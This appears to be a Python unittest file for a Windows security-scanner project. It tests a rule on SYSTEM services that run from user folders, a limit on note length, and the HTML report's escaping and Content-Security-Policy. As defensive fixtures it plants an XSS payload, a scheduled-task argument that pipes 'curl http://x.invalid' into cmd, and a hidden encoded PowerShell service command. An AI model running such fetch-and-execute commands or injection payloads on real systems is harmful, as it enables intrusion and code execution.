"""Slice 6 tests: the SYSTEM-service rule, the longer severity-note limit, and
the HTML report's escaping, Content-Security-Policy and content.

    python -m unittest test_slice6 -v
"""

import contextlib
import io
import json
import re
import tempfile
import unittest
from datetime import datetime, timezone
from html.parser import HTMLParser
from pathlib import Path

import baseline
import checks
import redact
import report_html
import runner
import scan
import snapshot
import validate
from test_slice1 import fake_run
from test_slice4 import good_answer

NOW = datetime(2026, 11, 23, 12, 0, 0, tzinfo=timezone.utc)
EVIL = '"><script>alert(1)</script><img src=x onerror=alert(2)>'


def ok(name, data):
    return runner.RunResult(name, True, json.dumps(data))


def planted(overrides=None, now=NOW):
    snap = snapshot.build_snapshot(fake_run(overrides), now=now)
    return snap, checks.run_checks(snap)


def service(name, path, run_as="LocalSystem"):
    return {"Name": name, "DisplayName": name, "PathName": path, "State": "Running", "StartName": run_as}


class Tags(HTMLParser):
    """Every real tag the browser would build, with its attributes."""

    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def parse(text):
    p = Tags()
    p.feed(text)
    return p.tags


class SystemServiceRuleTests(unittest.TestCase):
    def services(self, *rows):
        snap, findings = planted({"win_auto_services": ok("win_auto_services", list(rows))})
        return findings

    def test_system_service_from_appdata_is_medium(self):
        f = self.services(service("Upd", "C:\\Users\\a\\AppData\\Local\\u\\u.exe"))
        hits = [x for x in f if x["check"] == "SVC-SYSTEM-USER-PATH"]
        self.assertEqual([(x["subject"], x["severity"]) for x in hits], [("Upd", "medium")])
        self.assertEqual([x for x in f if x["check"] == "PERSIST-REVIEW" and x["subject"] == "Upd"], [])

    def test_nt_authority_system_counts(self):
        f = self.services(service("Upd", "C:\\Users\\Public\\u.exe", run_as="NT AUTHORITY\\SYSTEM"))
        self.assertTrue(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))

    def test_non_system_service_stays_a_low_review(self):
        f = self.services(service("Upd", "C:\\Users\\a\\AppData\\Local\\u\\u.exe", run_as="NT AUTHORITY\\LocalService"))
        self.assertFalse(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))
        self.assertTrue(any(x["check"] == "PERSIST-REVIEW" and x["subject"] == "Upd" for x in f))

    def test_programdata_and_program_files_are_not_flagged(self):
        f = self.services(service("A", "C:\\ProgramData\\vendor\\a.exe"),
                          service("B", "\"C:\\Program Files\\Vendor\\b.exe\""))
        self.assertFalse(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))

    def test_suspicious_system_service_keeps_its_suspicious_finding(self):
        f = self.services(service("Bad", "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4A"))
        self.assertTrue(any(x["check"] == "PERSIST-SUSPICIOUS" and x["subject"] == "Bad" for x in f))


class NoteLimitTests(unittest.TestCase):
    def test_note_reason_up_to_800_chars_is_kept(self):
        snap, findings = planted()
        low = next(f for f in findings if f["check"] == "ACCT-DAILY-ADMIN")
        for length, kept in ((470, True), (790, True), (900, False)):
            a = good_answer(findings)
            a["severity_notes"] = [{"finding_id": low["id"], "suggested_severity": "medium", "reason": "x" * length}]
            v = validate.validate(a, findings, redact.Redactor(snap))
            self.assertEqual(bool(v["notes"]), kept, length)


class HtmlSafetyTests(unittest.TestCase):
    def setUp(self):
        tasks = json.loads((Path(__file__).parent / "fixtures/recorded/win_scheduled_tasks.json").read_text())
        tasks.append({"TaskPath": "\\", "TaskName": EVIL, "State": "Ready", "Author": EVIL, "UserId": "x",
                      "RunLevel": "Limited", "Execute": "cmd.exe", "Arguments": "/c curl http://x.invalid | cmd",
                      "ClassId": None})
        self.snap, self.findings = planted({"win_scheduled_tasks": ok("win_scheduled_tasks", tasks)})
        a = good_answer(self.findings)
        a["summary"] = "Summary " + EVIL
        a["groups"][1]["explanation"] = "# heading\n\n" + EVIL
        v = validate.validate(a, self.findings, redact.Redactor(self.snap))
        self.ai = {"validated": v, "info": {"model": "m", "input_tokens": 1, "output_tokens": 2}}
        self.text = report_html.render(self.snap, self.findings, {"diff": None}, self.ai)
        self.tags = parse(self.text)

    def test_hostile_text_never_becomes_a_tag(self):
        self.assertTrue(any(EVIL[:20] in f["subject"] for f in self.findings), "fixture didn't plant the text")
        self.assertNotIn("<script>alert", self.text)
        self.assertNotIn("<img", self.text)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", self.text)
        self.assertEqual([t for t, a in self.tags if t == "img"], [])
        self.assertFalse(any(k.startswith("on") for _, a in self.tags for k in a), "an event-handler attribute leaked")

    def test_csp_allows_only_this_reports_nonce(self):
        meta = [a for t, a in self.tags if t == "meta" and a.get("http-equiv") == "Content-Security-Policy"]
        self.assertEqual(len(meta), 1)
        csp = meta[0]["content"]
        nonce = re.search(r"script-src 'nonce-([^']+)'", csp).group(1)
        self.assertIn("default-src 'none'", csp)
        self.assertNotIn("unsafe-inline", csp)
        scripts = [a for t, a in self.tags if t == "script"]
        styles = [a for t, a in self.tags if t == "style"]
        self.assertEqual(len(scripts), 1)
        self.assertEqual(len(styles), 1)
        self.assertEqual({scripts[0].get("nonce"), styles[0].get("nonce")}, {nonce})

    def test_nonce_differs_every_render(self):
        again = report_html.render(self.snap, self.findings, None, None)
        n1 = re.search(r"nonce-([^']+)'", self.text).group(1)
        n2 = re.search(r"nonce-([^']+)'", again).group(1)
        self.assertNotEqual(n1, n2)

    def test_nothing_loads_from_outside(self):
        for tag, attrs in self.tags:
            self.assertNotIn("src", attrs, tag)
            href = attrs.get("href")
            self.assertTrue(href is None or href.startswith("#"), f"{tag} href={href}")

    def test_claude_text_is_plain_text(self):
        self.assertNotIn("<h1>heading", self.text)
        self.assertIn("# heading", self.text)


class HtmlContentTests(unittest.TestCase):
    def test_counts_cards_and_filters(self):
        snap, findings = planted()
        text = report_html.render(snap, findings, None, None)
        tags = parse(text)
        cards = [a for t, a in tags if t == "details"]
        self.assertEqual(len(cards), len(findings))
        self.assertEqual({a["data-sev"] for a in cards}, {f["severity"] for f in findings})
        high = sum(1 for f in findings if f["severity"] == "high")
        self.assertIn(f'data-filter="high" aria-pressed="false">high <b>{high}</b>', text)
        self.assertEqual(sum(1 for a in cards if "open" in a), sum(1 for f in findings if f["severity"] in ("high", "medium")))

    def test_ai_groups_link_to_findings(self):
        snap, findings = planted()
        v = validate.validate(good_answer(findings), findings, redact.Redactor(snap))
        text = report_html.render(snap, findings, None, {"validated": v, "info": {}})
        links = {a["href"] for t, a in parse(text) if t == "a"}
        ids = {f"#{a['id']}" for t, a in parse(text) if t == "details"}
        self.assertTrue(links)
        self.assertLessEqual(links, ids)

    def test_ai_error_and_no_findings(self):
        snap, _ = planted()
        text = report_html.render(snap, [], None, {"error": "Claude declined"})
        self.assertIn("Not available: Claude declined", text)
        self.assertIn("No findings.", text)

    def test_changes_section(self):
        old, _ = planted(now=datetime(2026, 11, 16, tzinfo=timezone.utc))
        new, findings = planted({"win_run_keys": ok("win_run_keys", [])})
        d = baseline.diff(old, new)
        text = report_html.render(new, findings, {"diff": d, "label": "base"}, None)
        self.assertIn("Removed since last scan", text)
        self.assertIn("WinUpdateHelper", text)

    def test_scan_writes_html(self):
        with tempfile.TemporaryDirectory() as d:
            p = snapshot.save_snapshot(planted()[0], Path(d) / "snapshots")
            with contextlib.redirect_stdout(io.StringIO()):
                scan.main(["--from-snapshot", str(p), "--out", d])
            pages = list((Path(d) / "reports").glob("*.html"))
            self.assertEqual(len(pages), 1)
            self.assertIn("Security posture report", pages[0].read_text())


if __name__ == "__main__":
    unittest.main()
